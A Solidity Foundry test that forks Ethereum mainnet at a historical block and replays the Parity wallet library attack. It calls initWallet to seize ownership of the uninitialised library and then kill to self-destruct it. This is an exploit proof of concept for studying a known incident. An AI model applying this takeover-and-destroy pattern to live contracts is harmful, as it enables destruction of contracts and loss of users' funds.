// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";
interface parity {
    function isOwner(address _addr) external view returns (bool);

    function kill(address _to) external;

    function initWallet(
        address[] memory _owners,
        uint256 _required,
        uint256 _daylimit
    ) external;
}


contract ContractTest is DSTest {

    parity WalletLibrary = parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));

    address[] public owner;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 mainnetFork;
    
    function setUp() public {
        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 4501735); //fork mainnet at block 4501735
        cheats.selectFork(mainnetFork);
    }

    function testExploit() public {

    WalletLibrary.isOwner(address(this));  // not a owner of contract
    owner.push(address(this));
    WalletLibrary.initWallet(owner,0,0);
    bool isowner = WalletLibrary.isOwner(address(this));  // you are owner of contract now
    assertTrue(isowner);
    WalletLibrary.kill(address(this));
    WalletLibrary.isOwner(address(this));  // contract destroyed, return 0 
    } 
        receive() external payable {}

}
